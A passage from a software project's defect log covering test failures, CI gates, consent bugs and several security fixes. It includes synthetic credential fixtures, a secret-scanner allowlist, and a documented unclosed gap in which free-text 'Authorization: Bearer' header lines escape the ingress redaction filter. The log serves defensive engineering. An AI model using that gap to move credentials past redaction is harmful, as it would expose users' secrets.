  `Test timeout of 30000ms exceeded.` directly above `Expect "toHaveCount" with timeout 90000ms`.
  It reads as a product hang and is nothing of the sort, which is exactly why it kept being triaged
  as "flake under heavy machine load": the closer the machine ran to the cap, the more specs tipped
  over, and WHICH ones varied per run. Several `docs/known-flakes.md` entries describing
  load-dependent failures at the tail of a long suite are candidates to re-read in this light.
  FIXED at the config, one line, not thirty edits: `timeout: 180_000` — above the longest legitimate
  wait (120s) with headroom, and a BACKSTOP rather than the bound, since each assertion still fails
  at its own budget so a stuck test surfaces where it stuck. Specs needing more still override with
  `test.setTimeout` (part-b-proof 1500s, voice-proof 480s, demos 300s).
  This was the second half of the demos cluster: on the wrong web port their bridge handshake also
  failed, so BOTH causes were real and each alone was enough to keep 28 tours red.

- **`artifact-backend-runtime-never-wired`** (FIXED 2026-08-14, HIGH, feature inert — found by
  repairing `artifact-backend-panel.spec.ts`; closed by the salomao-migration S1 slice, where a
  working `onEmail` plane became a headline customer requirement). **Artifact backends (Layer 2) cannot run at all.**
  `setArtifactBackendRuntime()` is defined in `api/src/apps/backend-runtime/runtime.ts` and is
  called from **nowhere** in `api/src`, so the module singleton stays `NullArtifactBackendRuntime`
  for the process's whole life and every `invoke` returns
  `{ ok: false, error: 'artifact backend runtime is not initialised' }`. `WorkerThreadRuntime`, the
  real implementation, is right there at `runtime.ts:166` — written, exported, never installed.
  Nothing outside the `backend-runtime/` directory imports the module at all.
  WHAT A USER SEES: an app can declare `backend: { entryPoint, handlers }`, the import builds it
  (`appBuilder.build` compiles the backend bundle), and the panel reports `hasBackend: true` with
  the handlers `declared` — so it all looks wired. Then every invocation fails, and
  `events/`-driven trigger delivery into an artifact backend silently does nothing.
  Verified against the running api: import an app with a declared backend, poll `sample-run` for
  40s, get "not initialised" on every attempt while `GET /:id/backend` cheerfully reports
  `hasBackend: true, declared: { entryPoint: 'backend/index.js', handlers: ['onEmail'] }`.
  NOT fixed here deliberately. Wiring it means constructing `RuntimeDeps` at the composition root —
  `resolveOwner`, `resolveBundlePath`, and the capability surface that mints tokens for user code
  executing in worker threads. That is a security-relevant change to an execution boundary, which
  the review policy sends to adversarial review; improvising it inside a red-fixing pass is exactly
  how such a thing lands unreviewed. `api/tests/security/` has suites for the capability layer that
  should be re-read as part of doing it.
  `web/e2e/artifact-backend-panel.spec.ts` is skipped at file level naming this finding, with its
  polling precondition left intact so the file starts working the moment the runtime is installed.
  This is the SAME SHAPE as the daemon seam that sat on its "honest default" until it was wired —
  see `docs/decisions.md` 2026-07-31 and the `LocalCommandSpec` docblock. Worth noting as a pattern:
  a seam with a null default reads as finished from every angle except running it.
  FIXED (2026-08-14, S1): `buildApp` (`api/src/server.ts`) now constructs `WorkerThreadRuntime`
  and calls `setArtifactBackendRuntime` — the deliberate composition-root change the paragraph
  above deferred, done as its own slice rather than inside a red-fixing pass. Seams bound: app-data
  through `AppDataAccess` on the injected deps; the model capability through the `llm/` public
  entry (`completeFast`, `user_work` / `artifact-backend:<entrypoint>`, billed to the artifact
  OWNER with the artifact stamped); `notify.email` through the SAME consent-gated app-email plane a
  served page uses (`sendAppEmail` with the owner as actor — a backend cannot out-privilege its
  app); `notify.inApp` on the notifications SSE rail. `resolveOwner`/`resolveBundlePath` stay on
  the runtime's own production defaults (one implementation, Rule 1). No integration seam is
  granted. Disposal runs on the boot shutdown path and on factory re-composition
  (`disposeArtifactBackendRuntime`, fail-closed back to the Null runtime). Suites:
  `api/tests/apps/backend-runtime-wiring.test.ts` (composition: a built app registers a non-Null
  runtime; teardown restores the fail-closed Null; capability grants match the pinned set) plus the
  pre-existing runtime/delivery suites now exercising the real path; the file-level skip on
  `web/e2e/artifact-backend-panel.spec.ts` is REMOVED — the spec's polling precondition, left
  intact for exactly this moment, now gates on real invokes.

- **`artifact-import-posts-a-shape-the-contract-rejects`** (FIXED 2026-07-31, HIGH, correctness —
  a live user-facing break, found by repairing the specs that existed to catch it). **Artifact
  import and bundle-update were broken end to end.** `web/lib/artifact-bundle.ts` reads an export or
  a "Transferir código" zip into a PORTABLE envelope — `{ schemaVersion, manifest, scaffold:
  [{ path, contentB64 }] }` — and `artifacts-surface.tsx` posted it, unconverted, at
  `POST /api/v1/artifacts/import`, whose contract (`shared/src/artifacts.ts`) is
  `{ manifestId, name?, files: [{ path, content }], data? }`. The server validates against the
  contract, so every import answered **400 VALIDATION_FAILED**, `path: ["bundle","manifestId"]`,
  which the UI showed as **"Dados inválidos."** Four call sites: `import` plus all three
  `bundleUpdate` paths.
  HOW IT SURVIVED TYPECHECK, which is the part worth remembering: TWO different types are named
  `ArtifactBundle` — this file's and the contract's — and each call site bridged them with
  `bundle as ArtifactBundle`. The cast is between unrelated shapes and TypeScript took it purely
  because the names matched. Past validation it would still have written NOTHING, since the server
  writes from `bundle.files` and the portable envelope has `scaffold`.
  FIXED with `toContractBundle()` on the reader's side (the contract is the source of truth), the
  four casts replaced by real conversions, and the local type imported as `PortableBundle` so the
  name collision cannot re-arm the same mistake. Proven against the RUNNING api: the same bundle
  gives 400 raw and 201 converted, with files written and UTF-8 intact. Pinned by four tests in
  `web/__tests__/lib/artifact-bundle.test.ts`; the UTF-8 one is revert-proofed (byte-wise decode
  yields `olÃ¡`).
- **`import-loses-the-manifest-so-a-backend-app-arrives-without-its-backend`** (FIXED 2026-08-01,
  HIGH, correctness — found while proving the import fix above). The contract's `ArtifactBundle` has
  no manifest field: only `manifestId, name, slug, files, data, version`. But `bundleFromZip`
  deliberately lifts `manifest.json` OUT of the scaffold into its own field ("the manifest travels
  in its own field"), so converting portable → contract dropped it entirely. The server writes the
  bundle's files, then `ensureManifest()` finds no manifest.json and writes a DEFAULT one — so
  everything the manifest declared was silently lost on import: `backend` (entryPoint + handlers —
  the app arrives with no backend at all), `extends`, `type`, `entryPoint`.
  Proven both ways against the running api: import the same app without manifest.json →
  `hasBackend: false, declared: null`; with it → `hasBackend: true, declared: { entryPoint:
  'backend/index.js', handlers: ['onEmail'] }`. FIXED in `toContractBundle` by appending the
  manifest as a `manifest.json` FILE — the only channel the contract has, and the one
  `ensureManifest` reads (it keeps an existing manifest and only forces id/name).
- **`featured-update-badge-unreachable-from-a-spec`** (OPEN 2026-07-31, LOW, test-coverage — a
  hardening, not a defect). `artifacts-apps-section`'s update-badge test seeds itself by PATCHing
  `data.customized` + `data.updateAvailable`. Both are in `RESERVED_ARTIFACT_DATA_KEYS` and stripped
  twice (route boundary and `patchArtifact`), deliberately: the same list stops a client writing
  `projectDir` (build-sandbox path injection) and `tours` (stored-content injection into the public
  `GET /api/demos/:appId`). A client that could forge "this app has an update" could also drive the
  flow it gates. The old RPC dispatcher allowed it; the rebuild closed it, correctly. So the fixture
  path is closed BY DESIGN and there is no legitimate public route to the state. The BEHAVIOUR is
  still worth covering — it needs a server-side seam (drive `featured-seeder.ts` with a bumped
  manifest version), which is a harness change with its own design. The test is skipped with this
  reasoning inline. Explicitly NOT done: widening the reserved-key list to make a test pass, which
  trades a security control for a green tick.
- **`a-tracked-test-file-that-vitest-never-loads`** (FIXED 2026-07-31, MEDIUM, test-estate — found
  by appending four tests to it and watching them not run). `web/lib/artifact-bundle.test.ts` was
  tracked in git, looked like coverage, and had **never executed**: `web/vitest.config`'s include is
  `['__tests__/**/*.test.{ts,tsx}', 'src/**/*.test.{ts,tsx}']`, and the file sits in neither. It was
  a leftover from the G9 frontend copy — an exact duplicate of the live
  `web/__tests__/lib/artifact-bundle.test.ts`, same nine test names. The suite-ledger census cannot
  see it either: it counts `web/__tests__` only, so the file was invisible from both directions.
  DELETED, with its unique value (nothing) established by diffing the test sets first. Worth
  recording as a class, not an incident: a test file outside the include is worse than no file,
  because it reads as coverage in review and in a directory listing. It was the ONLY one — checked.

- **`ported-e2e-estate-is-not-green`** (FIXED 2026-08-01 — **the estate is green**: 247 passed /
  0 failed / 8 skipped in 17.2m, `[suite-ledger] OK — census matches, every non-due artifact
  ledger-skipped, ratchet holds`, exit 0. Measured on a FRESH stack via `npm run e2e:server`, which
  matters: a warm reused stack accumulates state across runs, and re-running `demo-spine` alone
  deletes the shared Fonseca spine that later specs read. Several "flaky" readings during this work
  were that, self-inflicted. The causes are below and each has its own entry: the port artifact
  (`e2e-server-loses-to-a-running-dev-server`), the 30s cap
  (`thirty-specs-budgeted-waits-they-could-never-use`), three specs on a retired dispatcher, and
  two specs that could never pass on any checkout. Original entry kept below for the measurements.)
- **`ported-e2e-estate-is-not-green` — original 2026-07-31 record** (MEDIUM, process).
  `CLAUDE.md` says the ported estate "stays green on every PR" and that "a red baseline spec is fixed
  before any new work merges". It is not green and has not been for some time. Measured on this
  machine at gate G12, 242 due specs:
  - `origin/main` (`1984ac0`) alone: **49 failed / 179 passed** and **51 failed / 176 passed** on two
    runs of IDENTICAL code — so roughly two specs are outright flaky before anything else is said.
  - the merge (`4261a75`): **39 failed / 190 passed**, and its failure set is a STRICT SUBSET of
    `origin/main` run 1's. Nothing regressed; two specs that differ from run 2 both failed on run 1.
  - after the repairs below (`d6d922f`, same day): **37 failed / 205 passed / 5 skipped** in 37.4m.
    No new failures (the set is a strict subset of the 39), and the +15 passes are exactly the two
    repaired specs: `legal-shared-drift` now contributes 11 and `settings-redirects` 4. Runtime rose
    6.8 minutes, which is the cost of the `demos` budget fix below: those 28 now fail HONESTLY after
    ~60s each instead of being killed misleadingly at 30s. A fast lie is worse than a slow truth,
    but the real end state is fixing the spec, not paying that every run.
  Three of the 39 were provably broken rather than failing, and TWO OF THOSE ARE NOW CLOSED
  (2026-07-31, same day):
  - `legal-shared-drift.spec.ts` shelled out to `scripts/sync-legal-shared.mjs`, which is in neither
    parent — MODULE_NOT_FOUND on every run the estate has ever done. REWRITTEN to assert the
    invariant that script existed to protect, using only what this repo has: the shared layer's ten
    files must be byte-identical across every `legal-*` scaffold. It does not import a canonical
    directory, because choosing where that lives in this repo is a design decision and not a
    mechanical port — if all copies agree, the canonical layer is what they agree on. Now a REAL
    gate: 11 tests over 29 apps × 10 files, green, and verified to go red on a one-line drift probe.
  - `simuladores-trabalho.spec.ts` built from `join(process.cwd(), '..', 'ekoa-data', …)`, resolving
    OUTSIDE the checkout. RETIRED explicitly (ledger `retired` band, with the reasoning): it drove a
    UI app that was never ported here and is a featured artifact in neither repo. Nothing is lost —
    every figure it asserted is covered by `api/tests/legal/simuladores.test.ts`, 18 tests over the
    ported pure engine. If that app is ever ported, the spec comes back with it.
  The third is the big one and is STILL OPEN — see `demos-tour-waits-for-a-button-that-never-renders`
  below, which now has half of it fixed and the other half root-caused to a specific line.
  `docs/testing.md` does acknowledge "committed-baseline debt" in three named bands, but the debt is
  larger than those bands and is not enumerated anywhere, which is the actual problem: a red estate
  cannot detect the next failure.
- **`demos-tour-waits-for-a-button-that-never-renders`** (OPEN 2026-07-31, MEDIUM, test-estate — 28
  of the estate's reds, one cause, half of it now fixed). All 28 `demos.spec.ts` tours failed
  identically. There were TWO stacked causes and the first was hiding the second.
  - **FIXED — the test budget.** The file's waits were written as though they had minutes:
    `clickNext` allows 60s, the banner 90s, the overlay 45s. `playwright.config.ts` sets no
    `timeout`, so Playwright's DEFAULT 30s per-test cap applied and every one of those budgets was
    dead code. The output said so plainly and had been misread for as long as it has been printed:
    `Test timeout of 30000ms exceeded` sits directly above
    `Expect "toBeVisible" with timeout 60000ms`. A `test.setTimeout(300_000)` now gives the file the
    budget its own waits assume — the convention every other long spec here already follows
    (live-bridge 180s, summary-cards-chip 240s, voice-proof up to 480s).
  - **OPEN — what it was hiding.** With a real budget the tour genuinely runs: it logs in, mounts
    the overlay, and steps into the loop. It then dies waiting the full honest 60s for
    `demo-next` on a `step.to` navigation step. `DemoOverlay.tsx` renders that button only when
    `tour.awaitingManual && tour.status === "running"`; the sibling branch renders `demo-awaiting`
    for `status === "awaiting"`. So the tour is in a state that legitimately has no Next button and
    the SPEC is what is wrong: `demos.spec.ts:274` calls `clickNext` unconditionally whenever
    `step.copy` is set, without first checking that the tour is actually waiting for a manual
    advance. Likely a navigation step auto-advances and never gates on the user at all.
    NOT fixed here deliberately: correcting it means changing how the spec walks the tour state
    machine, and doing that without understanding the machine is how you get a test that passes for
    the wrong reason. The next person starts from a named line and a named condition rather than
    from "timeout".
- **`e2e-server-loses-to-a-running-dev-server`** (OPEN 2026-07-31, MEDIUM, tooling — cost a full
  30-minute run before it was noticed). `npm run e2e:server` binds three ports and only one of them
  is configurable in practice: `EKOA_WEB_PORT` (3000) and `EKOA_API_PORT` (4211) come from env, but
  the CORS proxy port is `readBackendPort()` — the committed `backend.port` — because `next.config.ts`
  INLINES that origin into the browser bundle. On a machine with a dev server already on :3000 the
  web app dies with `EADDRINUSE` and the harness reports **130 due artifacts red plus "10 drivers
  require a live dev API"**, which reads exactly like a catastrophic code regression and is not one.
  Worse for anyone checking first: the collision here was with an IPv6-only listener (`:::3000`), so
  a `/dev/tcp/127.0.0.1/3000` probe reported the port FREE. Use `ss -ltn`, and pass
  `EKOA_WEB_PORT` + `WEB_BASE_URL` together (the Playwright `baseURL` reads the latter, the harness's
  readiness poll the former — setting only one silently checks the wrong app). Recorded rather than
  fixed because the real fix is to make the proxy port configurable end-to-end, which means the
  inlined origin in `next.config.ts`, and that is its own change.
  **`EKOA_WEB_PORT` only rescues you when the other server is in a DIFFERENT directory.** Point the
  harness at a free port while a `next dev` is already running against the SAME `web/`, and Next's
  own single-instance guard refuses before the port is ever used: *"Another next dev server is
  already running"*, with the PID and directory. So the workaround holds from a second worktree and
  does NOT hold in the checkout that already has a dev server up — there, the only options are to
  stop that server or to verify from a worktree. Learnt the second way, after the first fix looked
  like it had worked.

- **`consent-once-re-prompts-forever`** (FIXED 2026-07-31, MEDIUM, correctness — found while merging
  the capability-contract and Cofre lines of work). `resolveConsent`'s `once` persisted nothing
  (correctly — that is the answer's whole meaning) and set the resume flag; the engine then re-ran
  the step, `local-command.ts` re-read the DURABLE approvals store, found nothing, and raised the
  same dialog. The only exits were "sempre" and "parar" — the two answers the user had just declined
  to give. There was no per-run consent state anywhere in the module: `signals` carried
  `resumeFlag`/`cancelled` and nothing else. PRE-EXISTING on both merged lines. FIXED with a
  run-scoped `runApprovedShapes` set on the signal record, threaded through `RunContext` and checked
  BEFORE the durable store so a one-off answer never touches it; in memory only, so a restart
  re-asks (the safe direction). The shape check now binds `once` as well as `always` — a mismatched
  `once` is the same caller-supplied-shape hole with a shorter blast radius. Pinned by two tests in
  `api/tests/automation/service.test.ts`; the first drives `once` to COMPLETION and then asserts the
  store is still empty, so it proves both halves at once. Reverting the executor's check makes it
  fail by TIMEOUT rather than assertion — the loop itself, observed.
- **`consent-approval-scope-mismatch`** (FIXED 2026-07-31, MEDIUM, correctness — found by merging,
  not by either line of work on its own). J-7 made a command-shape approval key on owner + org +
  MACHINE, and `executors/local-command.ts` looks it up with the connected daemon's real
  `pairingId`. `service.ts:resolveConsent` wrote it with `pairingId: null`. `idFor()` is an exact
  key, so the row written was never the row read: **"aprovar sempre" banked nothing the executor
  could find, the step re-checked, and the same consent dialog returned — forever — on precisely the
  machines able to run the command.** Invisible on both lines of work for the same reason: every
  consent test connects a fake daemon with no `pairingId`, so write and lookup both collapsed to
  `null`. The wiring of the daemon seam at the composition root (`server.ts`, which hands back
  `conn.pairingId`) is what made it reachable. FIXED by recording the scope on the ConsentRequest at
  the moment the executor asks — the party that will re-read it decides the key — and having
  `resolveConsent` bank the answer in it rather than re-derive one. Pinned by
  `api/tests/automation/service.test.ts` "banks the approval for the MACHINE the run is awaiting on",
  which uses a non-null `pairingId` and asserts the run COMPLETES, not just that a row exists;
  verified to fail on revert (`expected false to be true`).
- **`step-log-tail-outside-the-h1-filter`** (FIXED 2026-07-31, LOW, security defence-in-depth —
  found by reading the merged engine, not by a failing test). `redactStepRecord` (Cofre H-1) filters
  `error.message`, `error.details`, `output` and `resolvedAction` before a step record reaches the
  SSE stream, and its docblock says a new SINK inherits the filter. It does — but a new FIELD does
  not, and `logTail` (slice E4, the bounded tail of what a step streamed) arrived from the other line
  of work. So the emitted record carried the tail unfiltered. NOT a live leak on the wired path: the
  tail's only production source is daemon output, which is redacted at bridge INGRESS (H-4) before
  the engine ever sees it, and the persisted+served copy comes from the same already-filtered text.
  FIXED so the docblock is true of the whole record. Pinned by `api/tests/automation/run-logs.test.ts`
  "a secret streamed into the tail is redacted out of the emitted step record", which asserts the
  chunk really carried the value before asserting the emitted record does not; verified to fail on
  revert.
- **`binary-bytes-allowlist-went-stale-in-the-merge`** (FIXED 2026-07-31, LOW, hygiene). Two of the
  three shrink-only allowlist entries in `api/tests/security/binary-bytes-gate.test.ts`
  (`apps/document-source.test.ts`, `llm/anonymise/index.ts`) were cleaned by `1984ac0` on a parallel
  line of work that had never seen the gate. The ratchet did exactly its job at the merge: it failed
  on the stale entries instead of passing over them. Entries removed; the list is down to one.
- **`typist-emits-no-registo-row`** (OPEN 2026-07-29, LOW, auditability — found while pinning F-5).
  `typistLogin` records credential use on the ITEM (`lastUsedAt`/`lastUsedBy` via `recordUse`) but
  emits no Registo row, although the A-6 vocabulary defines `cofre_item_used` for exactly this. So a
  user reading their Registo sees the unlock and the grant but not the login that consumed it. Not a
  leak — the item row is metadata-only and carries no value — but an audit gap on the one primitive
  that handles a decrypted credential against a live page. Asserted in
  `api/tests/security/typist-non-memorable.test.ts` in the NEGATIVE direction so it is visible
  rather than assumed; flip that assertion when the row is emitted.
- **`trigger-null-target-blanks-the-webhooks-list`** (FIXED 2026-07-29, MEDIUM, correctness — found
  by repairing the e2e estate). `GET /api/v1/triggers` emitted `automationId: null` for a trigger
  created against an ARTIFACT (and `artifactId: null` for the reverse). `shared/` types both as
  `Id.optional()`, and zod's `.optional()` accepts `undefined` but **rejects `null`** — so
  `TriggerListResponse` failed to parse client-side, `tryCall` reported not-ok, and the webhooks
  store kept an empty array. The user saw **"Ainda não existem webhooks" over a populated
  database**, with no error surfaced anywhere: creating a webhook returned 201, the row never
  appeared, and nothing said why. FIXED in `triggerView` by omitting absent optionals instead of
  passing null — the same field-by-field discipline `sessionView` already uses. Worth recording why
  this survived a surface the schema-coverage gate marks COVERED: every existing fixture set one
  target or the other, so `null` never appeared in a test. The new cases construct the real
  database shape (an explicit `null`) and go red against the old mapper.
- **`pipedream-master-switch-inert`** (FIXED 2026-07-29, HIGH, security — found by repairing the e2e
  estate, not by reading code). The Pipedream master toggle **could not be turned off**.
  `PATCH /api/v1/settings` persists via `patchOrgSettings`, which writes the ORG document
  (`orgs[orgId].settings`); the enforcement read `isPipedreamEnabled()` went to
  `settings.get('default')` — a different collection, and a document nothing ever writes. It
  therefore always read null, and on null returned `undefined !== false` → **true**. Two independent
  defects compounding: the wrong store, and a FAIL-OPEN default on a third-party egress integration.
  Symptoms an operator would see: turning it off returns 200, `GET /settings` reports
  `pipedreamEnabled:false`, and the UI toggle snaps back to on — because the toggle renders
  `status.enabled` (the broken read) while writing to settings. `runPipedreamAction`'s `disabled`
  guard never fired once. FIXED: the read now uses the org document the write lands in, and defaults
  to DENY, matching `mergedSettings` (what the API and UI report). Pinned by
  `api/tests/security/pipedream-master-switch.test.ts` (8 cases; 7 go red against the original).
  Note for auditors: two pre-existing tests in `tests/integrations/pipedream.test.ts` "disabled" the
  feature by writing `settings['default']` — they passed by exercising the bug's own plumbing, which
  is why the defect survived a suite that appeared to cover it.
- **`npm-audit-gate-unsatisfiable-and-unread`** (FIXED 2026-07-29, MEDIUM, process/security). The
  `security-gates` job had been failing at `npm audit --audit-level=high` (17 vulnerabilities, 10
  high). The gate was UNSATISFIABLE as written and therefore unread: two of its highs have no fixed
  version at all, so the only ways to green were to drop the threshold (stop seeing highs) or wait
  forever. Meanwhile the genuinely actionable production advisories sat unnoticed behind the noise.
  FIXED in two parts. **Upgrades** (production highs 9 -> 0 unaccepted): `next` 16.2.10 -> 16.2.12,
  `dembrandt` 0.23.1 -> 0.25.1, `react-router-dom` -> 7.18.2, plus root `overrides` forcing
  `postcss` 8.5.24, `sharp` 0.35.3, `adm-zip` 0.6.0, `fast-uri` 3.1.4. **A real gate**
  (`scripts/audit-gate.mjs`) replacing the blunt flag: it blocks on any unaccepted high/critical in
  the PRODUCTION tree (`--omit=dev` — those ship), reports dev-tree highs without blocking (a DoS in
  the linter's glob matcher is not a path to tenant data), and accepts only explicitly documented
  advisories, each stating why it is unreachable and what would close it. Acceptance propagates
  transitively to a fixpoint, so a six-deep chain resolves from its root advisory. Verified
  non-vacuous: a planted unlisted critical fails, and a package that gains its OWN advisory cannot
  launder it through an accepted dependency.
- **`archiver-8-removed-the-factory-api`** (OPEN by design 2026-07-29, LOW, dependency). `archiver@8`
  clears the entire archiver advisory chain, and was tried and REVERTED. v8 is pure ESM exporting
  classes (`Archiver`, `ZipArchive`, ...) with no default and nothing callable, so
  `archiver('zip', ...)` in `api/src/services/app-archive.ts` becomes `TypeError: archiver is not a
  function` and the artifact download 500s (caught by `app-archive.test.ts` +
  `artifact-family.test.ts`). Migrating is a rewrite of a user-facing download path, not a shim, and
  the advisory it closes is a glob-expansion DoS that this code cannot reach — entries are added one
  at a time as `archive.file(absolutePath, { name: relPath })` from our own directory walk;
  `archive.glob()` and `archive.directory()` are never called. Accepted in `scripts/audit-gate.mjs`
  with that reasoning. Do the migration the next time `app-archive.ts` is opened for other reasons.
- **`e2e-estate-15-red-first-honest-measurement`** (PARTIALLY FIXED 2026-07-29 — 9 of 15 closed).
  With the CSP/CORS bring-up repaired, the estate ran to completion for the first time and reported
  15 real failures. They were never one problem. **FIXED (9):** five specs drove
  `POST /api/v1/action`, the old Cortex RPC dispatcher, which this repo does not implement and which
  is absent from `shared/` entirely — repointed to REST (`web/e2e/helpers/backend-rest.ts`), fixing
  onboarding (x3) and vertical-profile; two order dependencies (onboarding never set the LEGAL
  vertical its chips need; pages-manage's bare `getByRole('tab')` now spans page tabs AND filter
  pills, so `.nth(1)` navigated off the panel holding the search box); two stale ENGLISH selectors in
  a PT-PT product (`/Usage/i` vs "Utilização"; `iframe[title*="Preview"]` vs "Pré-visualização"); and
  two REAL PRODUCT BUGS with their own entries — `pipedream-master-switch-inert` and
  `trigger-null-target-blanks-the-webhooks-list`. **STILL OPEN (6),** each needing a decision rather
  than a fix:
  - `artifacts-apps-section`, `update-from-bundle`, `artifact-backend-panel` — need `ekoa.templates`
    / `ekoa.artifact-backend`, surfaces with **no route and no `shared/` module** in the rebuild.
    Either that functionality is still wanted (build it) or the specs are stale (retire them
    explicitly, per the QA process). Not a call to make silently from a test file.
  - `legal-shared-drift` — invokes `scripts/sync-legal-shared.mjs`, which exists nowhere in the repo
    or its history, against a canonical `ekoa-data/legal-shared/` that also does not exist. The
    invariant is real (six scaffolds must not drift from a shared layer); the tool was never ported.
  - `simuladores-trabalho` — needs `ekoa-data/apps/simuladores-trabalho/build.mjs`, a user-app build
    artifact not in the repo. The underlying logic IS ported and unit-tested
    (`api/src/legal/simuladores.ts`, `api/tests/legal/simuladores.test.ts`).
  - `legal-rcbe` — NOT idempotent: it completes the demo obligation and re-running finds it already
    `cumprida`, so it asserts "atraso|Pendente" against fulfilled state. The scaffold has a reset,
    but it is gated on `isDemoActive()` (an injected tour runtime the spec cannot trigger) and the
    data lives in served-app shared storage that survives runs. Needs a deterministic reset hook.

- **`ci-e2e-step-could-never-pass`** (FIXED 2026-07-29, MEDIUM, process — surfaced when the lane
  first reached the e2e step). With typecheck, `npm test` and `npm run build` all green for the
  first time, `npm run e2e` failed for two structural reasons, neither a test defect: (1) Playwright's
  browsers were never installed on the runner, so the first `chromium.launch()` died with
  "Executable doesn't exist at ~/.cache/ms-playwright/..." — `Dockerfile.api` already installs them
  for exactly this reason; (2) the step ran the BARE ledger runner, which needs a live api on :4111
  and reports "10 due driver(s) require a live dev API — an unreachable-server skip is NOT green".
  The repo already contains the fix: `scripts/e2e-with-server.mjs` (`npm run e2e:server`) boots
  dev-api on an ephemeral memory-mongo, waits for READY plus the featured prebuild, runs the ledger
  and tears down — and its own docblock says "CI sets EKOA_SCREENSHOTS_DISABLED", i.e. it was
  written for this lane, which then never called it. FIXED by installing chromium and calling
  `e2e:server`; it needs `npm run build` output, which the preceding step already produces. Same
  class as `ci-typecheck-never-ran` and `subprocess-isolation-test-could-never-pass-on-ci`: a step
  that had never once executed its actual work, invisible for as long as an earlier step failed
  first.
- **`subprocess-isolation-test-could-never-pass-on-ci`** (FIXED 2026-07-29, MEDIUM, test-integrity
  — surfaced the moment CI first reached `npm test`). `api/tests/llm/subprocess-isolation.test.ts`
  asserted that the literal string `ekoa-code` appears nowhere in the SDK subprocess spawn contract,
  using the repo's directory NAME as a proxy for "a host path leaked". On GitHub Actions the repo is
  *named* `ekoa-code`, so GitHub's own injected metadata (`GITHUB_REPOSITORY`,
  `GITHUB_WORKFLOW_REF`) and npm's workspace-PARENT bin entry
  (`/home/runner/work/ekoa-code/node_modules/.bin` — NOT under the checkout root, so correctly kept
  by the F25 `underPathRoot` filter) all contain it. **The test was green locally and structurally
  red on CI, and could never have passed there.** Nobody saw it because the lane died at typecheck
  before reaching `npm test` (`ci-typecheck-never-ran`) — fixing CI is what exposed it. FIXED by
  asserting the invariant the code actually implements: the sandbox is neither the server cwd nor
  the operator home, `env.HOME` is the sandbox, no NON-PATH value carries the checkout or the
  operator home, and PATH carries no segment under the checkout root. PATH is exempt from the
  home-check BY DESIGN and by written disposition (the accepted `subprocess PATH home-path residual`
  below): node and the toolchain live under `$HOME` on nvm/fnm/volta/asdf hosts and the SDK spawns a
  bare `node` against this PATH, so filtering `$HOME` out of it ENOENTs every model subprocess.
  Verified three ways: passes under the simulated CI vars, the old assertion provably fails under
  the same vars, and it still goes red when the PATH-root filter is removed.
- **`gitleaks-red-on-synthetic-fixtures`** (FIXED 2026-07-29, MEDIUM, process — found when the
  first push finally reached CI). The `security-gates` job had been RED since 2026-07-27, failing at
  the gitleaks step on five `generic-api-key` hits. All five are synthetic credential fixtures in
  the Cofre security suite (`sk-live-COFRE-TEST-0001`, `sk-live-EXFILTRATE-ME-0001`,
  `sk-live-BOUNDARY-TEST-0001`, `sk-live-abcdef123456`, and — added by this session's J-3 —
  `deliver-me-J3-SECRET-9911`). They are deliberately secret-SHAPED, because the suites they belong
  to test that a secret-shaped value is redacted, refused or never echoed, and a fixture that did
  not look like a credential would prove nothing. Two consequences of the redness are the reason
  this is MEDIUM rather than cosmetic: a red gate carries no signal, and it had been red long enough
  that a REAL leak would have arrived into an already-failing check. FIXED by allowlisting the five
  VALUES in `scripts/gitleaks.toml` — deliberately not by path: an
  `api/tests/security/**` path allowlist is one line instead of five and would blind the scanner to
  a real token pasted into a test file, which is a normal way credentials escape. Renaming the
  fixtures was not an option: `gitleaks detect` scans git HISTORY, so the original literal stays
  reachable in the commit that introduced it. Going forward a new fixture should carry
  `EKOA-SYNTHETIC-`, covered generically. Verified precise: a real-looking `sk-live-...` in the same
  directory still fails the scan.
- **`bridge-ingress-freetext-header-residual`** (OPEN by design 2026-07-29, LOW, confidentiality —
  found while building H-4). The ingress filter has two legs: value-keyed (exact, for values Cortex
  delivered) and name-pattern (`redactBodyByName`, for credentials Cortex never held). The name leg
  understands JSON keys and `key=value` pairs. A colon-separated header line in free-text stdout —
  `Authorization: Bearer sk-live-...` — matches neither shape and survives it, so such a value is
  removed only when Cortex DELIVERED it and the value leg recognises it. NOT closed, deliberately:
  widening the name leg to colon-separated pairs would fire on ordinary prose, including any
  `word: value` line in a document excerpt, and a filter that mangles legitimate output is one
  people route around. Pinned in BOTH directions by
  `api/tests/security/bridge-ingress-redaction.test.ts` (the leak asserted as surviving, and the
  delivered-value mitigation asserted as working), so if it is ever closed the expectation flips
  and the test says so rather than the behaviour drifting silently.
- **`ci-typecheck-never-ran`** (FIXED 2026-07-28, HIGH, process — found while fixing the red
  typecheck baseline for A-8). **The per-PR CI lane has never successfully typechecked `api/` or
  `web/`.** `.github/workflows/ci.yml` ran `npm run typecheck` with no prior build of `shared`, but
  `api/` and `web/` resolve `@ekoa/shared` through its package `types` field
  (`shared/dist/index.d.ts`), which is gitignored and only exists after `npm run build --workspace
  shared`. On a fresh `npm ci` checkout the step therefore died with **87 x TS2307 "Cannot find
  module '@ekoa/shared'"** — reproduced locally by moving `shared/dist` aside — so the step failed
  for a MISSING ARTIFACT, never reaching a single real type error. A local tree hides it completely,
  because `shared/dist` survives from an earlier build. Two consequences, and the second is the
  reason this is HIGH rather than a chore: (1) `ci` has been red on `main` for at least the last
  eight runs and the redness carried no information, which is how a lane stops being read; (2) real
  type errors accumulated on `main` unnoticed — 9 of them at the time of writing, listed below —
  because nothing anywhere was checking. FIXED by building `shared` before the typecheck step.
  Verification is the next CI run on push; the local equivalent (`rm -rf shared/dist && npm run
  build --workspace shared && npm run typecheck`) is green.
- **`main-typecheck-red-9-errors`** (FIXED 2026-07-28, MEDIUM, correctness — the errors
  `ci-typecheck-never-ran` was hiding). Nine `tsc` errors on clean `main` at `619277b`, all landed
  by recent Cofre work: (a) `scripts/migrate/ciphertext-v2.ts` imported a non-existent export — see
  `k4-migration-dead-on-arrival`, which is the more serious half; (b) `tests/bridge/revoke.test.ts`
  (x2) and `tests/fake-daemon/correlation-join.test.ts` passed a `DelegationActor` without the
  `orgId` that E-1 made REQUIRED — `integration.test.ts` was updated in that change and these two
  were missed; (c) `tests/security/page-value-leaks.test.ts` (x3) built css locators as
  `{strategy:'css', value}` where the `Locator` union requires `{strategy:'css', selector}`, so
  `describeLocator` read `undefined` and the cache content under test was `css="undefined"` — the
  assertions passed while never exercising a well-formed locator, so this was a green test proving
  less than it claimed (now also asserts the selector IS retained, since shape is what the summary
  is allowed to keep); (d) `tests/security/screenshot-masking.test.ts` (x2) indexed
